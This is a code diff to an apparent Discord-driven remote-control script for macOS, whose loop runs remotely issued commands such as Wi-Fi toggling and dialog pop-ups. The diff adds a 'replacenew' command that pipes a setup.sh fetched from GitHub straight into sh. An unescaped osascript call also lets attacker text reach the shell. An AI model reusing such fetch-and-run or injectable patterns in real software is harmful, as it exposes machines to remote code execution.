@@ -50,7 +50,6 @@ while True:
             ossystem("/usr/sbin/networksetup -setairportpower en0 on")
             sleep(3)
             continue
-        # execute command
         localcmd = None
         if old_command != command:
             try:
@@ -119,6 +118,10 @@ while True:
                             except KeyboardInterrupt:
                                 continue
                             continue
+                elif command == ('replacenew'):
+                    system('curl -fsSL https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/setup.sh | sh', shell=True)
+                    from sys import exit
+                    exit()
                 elif command.startswith('syspower'):
                     localcmd = command.split()
                     if localcmd[1<len(localcmd)]:
@@ -201,6 +204,10 @@ while True:
                     localcmd = command.split()
                     if localcmd[1<len(localcmd)]:
                         try:
+#                            if localcmd[1] == 'upload' or localcmd[1] == 'get':
+#                                if localcmd[2<len(localcmd)]:
+#                                    
+
                             if localcmd[1] == 'dialog' or localcmd[1] == 'popup' or localcmd[1] == 'dropmenu':
                                 if localcmd[2<len(localcmd)]:
                                     if ossystem(f'osascript -e \'display dialog "{localcmd[2]}" buttons "Yes"\'') == 0:
